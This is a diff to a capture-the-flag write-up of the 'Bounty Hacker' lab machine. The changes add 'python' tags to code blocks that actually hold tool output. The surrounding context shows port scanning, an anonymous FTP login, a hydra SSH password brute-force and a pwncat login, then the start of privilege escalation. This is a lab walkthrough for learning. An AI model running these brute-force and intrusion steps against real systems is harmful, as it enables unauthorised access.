@@ -18,7 +18,7 @@ As always we start with rustscan I like its style and it instantly gives a respo
 rustscan -a $IP -- -A -sC -oN nmap.txt
 ````````
 
-````````
+````````python
 .----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
 | {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
 | .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
@@ -175,7 +175,7 @@ Here we have 3 ports open 21,22,80. First, let us check FTP(21)...
 ftp $IP
 ````````
 
-````````
+````````python
 Connected to 10.10.3.202.
 220 (vsFTPd 3.0.3)
 Name (10.10.3.202:root): anonymous
@@ -217,7 +217,7 @@ let's brute-force the user lin over ssh...
 hydra -l lin -P locks.txt ssh://$IP
 ````````
 
-````````
+````````python
 Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-05-28 22:34:15
@@ -238,7 +238,7 @@ so, we have the password of lin, lets login via ssh and get our first flag
 pwncat-cs lin@$IP
 ````````
 
-````````
+````````python
 [22:36:15] Welcome to pwncat 🐈!                                                                                                                              __main__.py:164
 Password: ******************
 [22:36:23] 10.10.3.202:22: registered new host w/ db                                                                                                           manager.py:957
@@ -253,7 +253,7 @@ user.txt
 
 ## Privilage Esculation (Getting root.txt)
 
-````````
+````````python
 (remote) lin@bountyhacker:/home/lin/Desktop$ sudo -l
 Matching Defaults entries for lin on bountyhacker:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
